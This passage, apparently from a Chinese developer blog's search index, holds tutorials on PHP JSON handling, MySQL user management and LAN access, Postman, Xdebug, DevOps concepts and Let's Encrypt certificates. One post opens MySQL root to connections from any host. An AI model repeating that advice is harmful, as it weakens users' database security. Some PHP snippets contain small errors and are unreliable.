协议的。 PHP 二进制命令能够处理脚本并且能够通过套接字与Nginx 交互，但是这种方式并不是效率最高的，php-fpm 便是在这样的背景下诞生的。 PHP-FPM （PHP FastCgi 进程管理，PHP Fastcgi Process Manager） php-fpm 将 fastcgi 带到了一个全新的水平。 php-fpm 和 nginx 有什么联系在理解了 cgi、fastcgi、php-fpm 是什么之后，就不难理解 php-fpm 和nginx是什么关系了。 因为 php-fpm 是 php fastcgi 的进程管理器，所以 php-fpm 就是 nginx 与 php 交互时，协助 php 将性能发挥最大的一个程序。 难怪每次 php-fpm 这个进程死掉时，nginx 的状态就变成了 502 。 参考链接 搞不清 Fastcgi 和 cgi 关系","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"如何将 JSON 对象转换成 PHP 数组","slug":"how-to-convert-a-json-object-into-a-php-array","date":"2020-09-22T14:58:35.000Z","updated":"2020-09-22T15:00:32.495Z","comments":true,"path":"how-to-convert-a-json-object-into-a-php-array/","link":"","permalink":"https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/","excerpt":"在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。","text":"在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。 JSON通俗一点讲JSON 就是一种数据结构，就是一串字符串，只不过元素会通过特定的符号标注。 {}：大括号表示对象 []：中括号表示数组 &quot;&quot;：双引号内是属性或值 标准的JSON 对象： 123456# 这是一个JSON 对象&#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25&#125; 标准的JSON 数组： 123456789101112131415161718# 这是一个包含两个对象的JSON 数组[ &#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25 &#125;, &#123; &quot;name&quot;: &quot;max&quot;, &quot;gender&quot;: &quot;men&quot;,, &quot;age&quot;: 29 &#125;]# 这是一个包含数组的JSON 对象&#123; &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]&#125; 在熟悉了几种常见的JSON 字符串之后，在来看一下如何解析JSON 字符串。 json_decodeJSON 对象转换为对象 123456789101112131415161718&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$obj &#x3D; json_decode($jsonObj);print $obj-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;boo$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;$obj2 &#x3D; json_decode($jsonObj2);print $obj[0]-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;booobject(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)array (size&#x3D;1) 0 &#x3D;&gt; object(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) JSON 对象转换为数组 12345678&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$arr &#x3D; json_decode($jsonObj, true);print $arr[&#39;name&#39;]; &#x2F;&#x2F;booarray (size&#x3D;1) &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) 需要注意几个容易出错的细节： 123456789101112&lt;?php&#x2F;&#x2F; 大括号外需要使用单引号$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; 属性需要使用双引号引起来$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; 不允许尾随逗号$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null json_encode下面来看看如何返回JSON 格式的数据，通过使用 json_encode这个函数： 123456789101112131415161718192021222324252627$b &#x3D; array();echo &quot;空数组作为数组输出: &quot;, json_encode($b), &quot;\\n&quot;; &#x2F;&#x2F;空数组作为数组输出：[]echo &quot;空数组作为对象输出: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;空数组作为对象输出：&#123;&#125;$c &#x3D; array(array(1,2,3));echo &quot;多维数组作为数组输出: &quot;, json_encode($c), &quot;\\n&quot;; &#x2F;&#x2F;多维数组作为数组输出：[[1,2,3]]echo &quot;多维数组作为对象输出: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;多维数组作为对象输出：&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d), &quot;\\n&quot;; &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;$arr &#x3D; array( &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;gender&quot; &#x3D;&gt; &quot;men&quot;, &quot;age&quot; &#x3D;&gt; 22);$res &#x3D; json_encode($arr);var_dump($res);echo($res);string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"同一局域网内如何访问项目地址、连接 Mysql","slug":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network","date":"2020-09-21T13:42:44.000Z","updated":"2020-09-23T14:46:39.880Z","comments":true,"path":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","excerpt":"如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。","text":"如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。 局域网内共享项目地址有时候会有这样一种需求，自己在本地项目做开发，还没放到服务器上，但是其他人希望能在他的电脑上访问项目。 这个时候就需要这两台电脑在同一个局域网内，也就是连接相同的WiFi 。 然后查看自己的外网IP 地址是多少： 12345# mac&#x2F;linuxifconfig# windowsipconfig 外网IP 地址通常是以192.168.x.xxx打头的IP ，然后把这个IP 配置到对应的域名。 123456789# mac&#x2F;linuxvim &#x2F;usr&#x2F;etc&#x2F;hosts# windowsC:\\Windows\\ System32 \\drivers\\etc\\hosts# hosts 127.0.0.1 example.com192.168.x.xxx example.com 配置完成之后，直接把example.com这个域名丢给对方，对方就在他自己的电脑上可以访问了。 局域网内连接Mysql想要在局域网内，让别人能连接到我的数据库，需要注意以下两点： 对本地Mysql 授权，允许其他用户连接 Mysql 开放外网访问 对于第一点，可以以下命令来完成： 123451. mysql -hlocalhost -uroot -p;2. use mysql;# 修改权限，允许其他人连接：3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;4. flush privileges; 通常完成第一步，就可以连接了，如果连接异常，可以尝试第二步： 12345# 打开Mysql 配置文件vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnfbind-address &#x3D; 0.0.0.0# 127.0.0.1 替换成 0.0.0.0; 然后重启Mysql 数据库即可。 其他人怎么连接我的数据库？ 把这个丢给他： 123host：你的外网IP 地址user：你的Mysql 用户pwd：你的Mysql 密码","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"局域网","slug":"局域网","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"mysql5.7用户管理：添加用户、授权、撤权、修改密码","slug":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords","date":"2020-09-20T15:42:13.000Z","updated":"2020-09-20T15:43:47.158Z","comments":true,"path":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","link":"","permalink":"https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","excerpt":"因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。","text":"因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。 创建用户123# 语法：CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;mysql&gt; CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;; host 参数说明： %：匹配所有主机 localhost：当前主机，localhost 不会被解析成IP地址，而是通过UNIXsocket 连接 127.0.0.1：当前主机，通过TCP/IP 协议连接 ::1：当前主机，兼容支持ipv6 此时还没有授权，只能登陆，无法做其余操作 用户授权1234567891011121314# 创建完成之后授权mysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;# 创建用户同时授权mysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;# 刷新权限mysql&gt; flush privileges;# 查看用户所有权限mysql&gt; show grants for dev@&#39;%&#39;;# 撤消用户授权，撤消要求各参数与授权时使用的一致，可以先查看授权再撤消mysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;; privileges 参数说明： all privileges: 所有权限； select: 查询； insert: 新增记录; update: 更新记录； delete: 删除记录； create: 创建表； drop: 删除表； alter: 修改表结构； index: 索引相关权限； execute: 执行存储过程与call函数 references： 外键相关； create temporary tables：创建临时表； lock tables：锁表； create view：创建视图； show view：查看视图结构； trigger: 触发器； dbName 可以是某个库（database），也可以是具体到某张表（database.table），也可以是所整个数据库（*）。 修改密码1234567891011121314# 修改自己的密码mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);# 修改别人密码——方法1mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);# 修改别人密码——方法2: 适用mysql5.7以前的版本，5.7以后的版本中mysql.user表没有了password字段mysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;# 修改别人密码——方法3：适用mysql5.7mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;# 修改别人密码——方法4mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;; 删除用户1mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;; 不建议直接通过修改mysql.user表去操作用户。 参考链接 mysql5.7用户管理：添加用户、授权、撤权、修改密码","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Postman 使用技巧整理","slug":"postman-tips","date":"2020-09-19T12:58:16.000Z","updated":"2020-10-30T00:22:26.807Z","comments":true,"path":"postman-tips/","link":"","permalink":"https://www.0x2beace.com/postman-tips/","excerpt":"Postman 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。","text":"Postman 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。 发送表单提交这里的表单提交就是指传统的表单提交。 核心请求头信息： 12Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;Content-Type: application&#x2F;x-www-form-urlencoded body 的数据格式选择form-data。 发送Ajax 请求核心请求头信息： 123Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequest body 的数据格式选择 x-www-form-urlencode，如果选择form-data则接收到的数据格式会是这个样子： 如果以x-www-form-urlencode格式进行提交，那么接收到的数据是这个样子，可以直接通过魔术变量获取使用。 如何把请求参数作为json 格式进行提交？在Body中，选择raw 然后把请求参数以json 的格式填进去。 不过需要注意，以json 格式提交的请求，用常见的魔术变量获取不到，需要使用以下方式： 1json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); 提交文件有时候我们希望可以测试文件提交，使用 Postman 当然也可以完成。 请求方式选择POST，Headers 可以不用做选择，Body 选择 form-data，类型由默认的text 改成 file，然后选择需要提交的文件即可。 注意：key 最好也填上 file 这个关键字。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"}]},{"title":"Mysql 常见异常分析","slug":"mysql-common-exception-analysis","date":"2020-09-17T12:52:29.000Z","updated":"2020-09-17T12:57:42.663Z","comments":true,"path":"mysql-common-exception-analysis/","link":"","permalink":"https://www.0x2beace.com/mysql-common-exception-analysis/","excerpt":"本文用来整理 Mysql 使用过程中遇到的一些问题。","text":"本文用来整理 Mysql 使用过程中遇到的一些问题。 Mysql 无法正常启动异常描述：Mysql Server 无法正常启动，Client 连接Mysql 异常如下： ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2) 首先，这个错误意味着 /var/run/mysqld/mysqld.sock 不存在，而该文件之所以不存在，可能是因为没有安装 mysql-server，也可能是因为该文件被移动了。 如果是需要连接本机的Mysql（mysql -hlocalhost -uroot -p），那么需要先安装 mysql server： 1apt-get install mysql-server -y 如果Mysql 服务确实有在本地运行，那么请检查/etc/mysql/mysql.conf.d/mysqld.cnf 配置文件，是否存在以下配置： 1socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock 如果只是需要连接其他主机，那么在本机上不安装 Mysql Server 也可以，但需要保证“其他主机”的Mysql 已经正常启动。 1mysql -h&lt;hostname&gt; -uroot -p 总结：最有可能的情况是需要连接的Mysql 服务根本没有启动，要么没有在与从终端运行MySQL客户端的主机相同的主机上运行，小概率是因为配置文件错误导致。 Mysql 用户验证失败异常描述：Mysql 创建完该用户之后，赋予权限并设置密码，但是总是会提示如下异常： ERROR 1045 (28000): Access denied for user ‘zabbix’@’172.17.0.1’ (using password: YES) 出现该异常信息可能有以下几种情况： 用户名密码错误 该用户权限不足 Mysql 断开连接异常描述：Mysql 偶尔会自己断开连接，然后必须重启Mysql 服务才能正常运行。 ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 102 目前并没有找到合适的解决方案，不过能大致确定以下几个方向： 反向DNS 解析，避免使用localhost 允许使用所有连接？ localhost 对应socket？127.0.0.1 对应 TCP/IP？ 参考链接 错误2002(HY000)：无法通过Socket‘/var/run/mysqld/mysqld.sock’连接到本地MySQL服务器(2) ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading authorization packet’, system error: 0","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 数据库设计规范与原则","slug":"mysql-database-design-rules-and-principles","date":"2020-09-16T12:48:21.000Z","updated":"2020-09-16T12:51:01.020Z","comments":true,"path":"mysql-database-design-rules-and-principles/","link":"","permalink":"https://www.0x2beace.com/mysql-database-design-rules-and-principles/","excerpt":"最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。","text":"最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。 1、数据库命名规范 命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 _ 进行分割。 一般来说，数据表命名用单数，字段命名也用单数 数据库里面的密码一定要加密，不能保存明文 Mysql 引擎类型统一使用 InnoDB，字符编码统一使用 UTF-8 2、数据库表名命名规范 命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 _ 进行分割。 可以合理增加表前缀，有效区分不同类型的数据表 3、数据库表字段名命名规范 命名简洁明确，多个单词使用下划线_进行分割（统一使用小写） 避免使用自定义缩写，如：date =&gt; dt 表与表之间的相关联字段名称要求尽可能的相同 每个字段尽量备注其含义 4、数据库表字段类型规范 最好给每个字段一个默认值，避免使用 NULL。字符型默认值为一个空字符值串，数值型的默认值为数值0，逻辑型的默认值为数值0 用尽量少的存储空间来存储一个字段的数据 能用 tinyint 就不用 int，能用 int 就不要用 varchar，能用 varchar(16)就不要用 varchar(225) boolean 类型的命名统一使用is_xxx格式 5、数据库表索引规范 为每个表创建一个主键索引; 为每个表创建合理的普通索引; 一些注意事项 避免使用NULL字段(NULL字段很难查询优化、NULL字段的索引需要额外空间、NULL字段的复合索引无效) 避免使用 count(*) 避免使用 select * 参考链接 MYSQL数据库设计规范与原则 数据库设计原则 数据库表名字段命名规范","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows、Mac 下使用 PHPStorm 配置 Xdebug，实现断点调试","slug":"use-phpstorm-to-configure-xdebug-under-windows-and-mac","date":"2020-09-15T13:15:36.000Z","updated":"2020-09-15T13:21:21.882Z","comments":true,"path":"use-phpstorm-to-configure-xdebug-under-windows-and-mac/","link":"","permalink":"https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/","excerpt":"搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。所以便有了这篇关于PHPSTORM调试的笔记。","text":"搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。所以便有了这篇关于PHPSTORM调试的笔记。 在进行调试之前，首先要做的是下载并安装Xdebug，然后才能做相应的配置。 下载Xdebug（Windows） xdebug官网 如何选择符合自己PHP的版本的Xdebug，可以通过下面这种方法来判断。 使用Xdubug官方提供的一个检测工具 在命令行中输入： 12345678# Mac$ php -i | pbcopy# Linux$ php -i | xsel # Windows$ php -i | clip 将输出的phpinfo信息填入，然后就会自动检测该版本的PHP 所对应的Xdebug，如下图（这里以Windows 为例）： 点击下载相应的文件。 安装并配置Xdebug 将下载好的文件放进指定目录 ..\\php\\ext\\ 配置php.ini文件，这里需要注意的是：要找到正确的php.ini文件。如果你不确定是哪一个，可以参考下面这个方法： 打印出phpinfo()，找到字段Loaded Configuration File根据后面的路径去找就没错了。 打开找到的php.ini配置文件，在最后面加上以下代码： 12345678# Windows[XDebug]zend_extension &#x3D; &quot;C:\\xampp\\php\\ext\\php_xdebug-2.6.1-7.2-vc15.dll&quot; #这个地址指向 xdebug所在的文件路径xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTROMxdebug.remote_host &#x3D; localhost 其中： xdebug.remote.host如果是本地调试，填localhost就好。 xdebug.remote_port为调试所监听的端口，通常默认使用 9001 ，需要和PHPStorm 中的 Debug port 相同。 下载并安装Xdebug（Mac）Mac 下安装Xdebug，有两种方式： 使用pecl命令 通过源码编译 使用 pecl Pecl 是 PHP 的包管理器。 这里以PHP5.6为例，需要安装最新2.5.x版本的Xdebug，因为这是PHP5.6提供支持的最后一个版本。 1$ pecl install xdebug-2.5.5 源码编译源码获取的方式和上面Windows 的方式是一样的，将输出的phpinfo粘贴至输入框，然后下载对应版本的Xdebug。 123456$ tar -xvzf xdebug-2.9.4.tgz$ cd xdebug-2.9.4.tgz$ phpize$ .&#x2F;configure$ make$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug 启用Xdebug无论是通过哪种方式安装，在正式使用之前，都需要手动启用该模块。 找到对应版本的 php.ini 文件并编辑，在配置文件中的最后部分加上以下内容： 1234567[XDebug]zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTORMxdebug.remote_host &#x3D; localhost 重启PHP即可。 如何检查Xdebug 是否启用？ 12$ php -m | grep xdebugxdebug 在PHPStorm中配置XdebugMac File-&gt;Setting-&gt;PHP-&gt;Debug，确保PHPStorm 已经找到了Xdebug。 在刚才的配置没错的前提下，这里是可以看到已经成功安装了Xdebug的。 如果显示没有安装，请检查上面两步操作有无问题。 File-&gt;Setting-&gt;PHP-&gt;Debug Debug port 与php.ini配置文件中的xdebug.remote_port的对应参数保持一致。 File-&gt;Setting-&gt;PHP-&gt;Server，这三个参数的值和php.ini中的保持一致。 配置域名 这里根据实际情况配置，我本地使用80 端口作为项目访问端口，所以这里填的是80。 配置调试参数 Run-&gt;Web Server Debug Validation，检查是否配置成功。 确保项目文件路径和本地域名能正常访问，如果一切正常则能看到输出。 WindowsWindows 下的PHPStorm 配置和Mac 几乎差不多，保证一下几点是正常的基本上没啥问题。 确保PHPStorm 启用了对应版本的 Xdebug。 PHPStorm 的调试信息与php.ini文件中保持一致。 项目文件路径和本地域名能正常访问。 Xdebug 调试端口并非一定要用9001，只要保持php.ini与PHPStorm 的保持一致就好了。 在PHPStorm中使用Xdebug有两种方式使用Xdebug： 直接在编辑器中开始调试。 通过在请求地址中附加xdebug 的请求参数来调试，这招通常用来处理一些前后端分离的联动调试。 参考链接 PhpStrom Xdebug 配置与使用 如何在Mac 上为不同版本的PHP 开启Xdebug 配置Xdebug-官方教程 Xdebug 官网 Xdebug 检测工具","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"}]},{"title":"什么是DevOps、CI、CD、K8S","slug":"what-is-devops-ci-cd-k8s","date":"2020-09-12T14:40:00.000Z","updated":"2020-09-14T01:44:10.169Z","comments":true,"path":"what-is-devops-ci-cd-k8s/","link":"","permalink":"https://www.0x2beace.com/what-is-devops-ci-cd-k8s/","excerpt":"之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。 gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。","text":"之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。 gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。 只是了解到一个叫做 CI/CD的东西。后来又延伸扩展到DevOps、K8S 这些新概念。 什么是 DevOps？如题，什么是 DevOps ？根据字面意思理解就是：Dev + Ops，开发（Development）和运营（Operations）这两个领域的合并。 就我个人的理解，它是一个概念、一种思维，是一种通力合作，共同解决问题的方式。 这里我就不追根溯源去解释为什么要合并开发和运营了，因为历史原因，总是存在着这样的问题。具体看参考链接一。 DevOps 也不仅仅是一种软件的部署方法。它通过一种全新的方式，来思考如何让软件的作者（开发部门）和运营者（运营部门）进行合作与协同。使用了DevOps模型之后，会使两个部门更好的交互。其中，自动化部署的概念就是从中产生的。 什么是 CI/CD？Gitlab 的CI/CD到底是什么呢？ 昨天大致了解了下 Gitlab CI/CD，不是很明白，但觉得很厉害。首先来看下官方文档的简介： 软件开发的连续方法基于自动执行脚本，以最大限度地减少在开发应用程序时引入错误的可能性。从新代码的开发到部署，它们需要较少的人为干预甚至根本不需要干预。它涉及在每次小迭代中不断构建，测试和部署代码更改，从而减少基于有缺陷或失败的先前版本开发新代码的机会。 这里有三种主要的方法，根据最适合你的策略进行选择。 持续集成考虑一个应用程序，其代码存储在Gitlab中的存储库中。开发人员每天多次推送代码更改，对于每次推动到存储库，都可以创建一组脚本来自动构建和测试应用程序，从而减少向应用程序引入错误的可能性。这种方法被称为：持续集成（Continuous Integration） 持续交付持续交付 Continuous Delivery是持续集成的一个步骤，应用程序不仅在推送到代码库的每个代码更改时都构建和测试，而且作为一个额外的步骤，它也会连续部署，尽管部署是手动触发的。 持续部署持续部署 Continuous Deployment也是持续集成的又一步，类似于持续交付。不同之处在于，不必手动部署应用程序，而是将其设置为自动部署。完全不需要人工干预就可以部署应用程序。 什么是 K8S？参考链接 什么是DevOps？–程序员小灰 DevOps 到底是什么？ 使用GitLab介绍CI / CD Gitlab CI/CD 快速入门 Gitlab CI/CD 入门 Gitlab CI 示例 Docker 集成 Git Runner 是什么？ 安装Gitlab Runner 什么是 Auto DevOps K8S 是什么？知乎 为什么 K8S 很酷 K8S 中文指南 一文了解 K8S 是什么？","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"}]},{"title":"如何自动申请免费的SSL 证书","slug":"how-to-automatically-apply-for-a-free-ssl-certificate","date":"2020-09-11T08:18:20.000Z","updated":"2020-09-20T15:40:58.647Z","comments":true,"path":"how-to-automatically-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/","excerpt":"上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。","text":"上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。 Let’s Encrypt 是一个免费提供的SSL 证书的CA，虽然每次签发的有效期都只有三个月，但是发证是自动化的，发证速度较快，并且可以通过脚本来自动续签，为个人网站使用HTTPS提供了一个不错的选择。 Let’s Encrypt （以下简称LE）的证书签发主要使用基于 ACME协议 的证书自动管理客户端来实现。 LE官方推荐的客户端是 Certbot ，本文中就是使用 Certbot 来获取和续签证书。 LE 是如何自动签发证书的假设现在要申请CA 证书的域名是 example.com。 首先由WebServer（也就是我们用户端的服务器）的管理客户端（如Certbot）发送请求到LE，让LE来验证客户端是否真的控制example.com这个域名，接下来LE会提出一些验证动作（原文challenges），比如让客户端在一个很明显的路径上放指定的文件。同时，LE还会发出一个随机数，客户端需要用这个随机数和客户端自己的私钥来进行签名。 WebServer上的客户端完成LE指定的域名验证动作并且将加密后的签名后，再次发送请求到LE要求验证，LE会验证发回来的签名是否正确，并且验证域名验证动作是否完成，如下载指定的文件并且判断文件里面的内容是否符合要求。 这些验证都完成以后，可以申请证书了。 完成验证后，客户端生成自己的私钥以及 Certificate Signing Request（CSR） 发送到LE服务器，LE服务器会将CA证书（也是公钥）发放到你的服务器。 这样就完成了CA证书的自动化发放了。 使用Certbot 获取证书LE 的CA 证书发放原理看着还挺麻烦的，但如果使用 Certbot 客户端，整个过程还是挺简单的。 在正式获取证书之前，推荐先去Certbot 官网选择适合自己的系统环境。 我这边系统环境是Nginx + Ubuntu 18.04 LTS，所以下面介绍的安装流程只适用于Ubuntu + Nginx。 1. 安装 snapsnap 是Canonical公司发布的全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。使用snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间。 12$ sudo apt update$ sudo apt install snapd 2. 安装 certbot在安装 Certbot 之前，最好先移除历史快照。 1$ sudo apt-get remove certbot 进行安装： 1$ sudo snap install --classic certbot 3. 生成证书安装完成之后，下一步需要做的就是生成证书了，这里有两种方式： 生成证书并自动配置 1$ sudo certbot --nginx 生成证书手动配置 1$ sudo certbot certonly --nginx 我选择的是手动配置，大概流程如下： 输入常用邮箱，用来接收通知和恢复密钥。 同意使用协议。 输入需要做授权的域名，多个域名用空格隔开。 等待验证通过。 如果其中某个域名验证失败，则不会生成密码。 一切正常的话，可以看到/etc/letsencrypt/live/your_sites/目录下多了四个文件： cert.pem ： 公钥，服务器证书 chain.pem ： 中间证书 fullchain.pem ： 前两个的合集 privkey.pem ： 私钥 其中配置Nginx SSL 只需要用到fullchain.pem 和privkey.pem： 123456789server &#123; listen 443 ssl; server_name www.example.com; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem; ssl_certificate_key 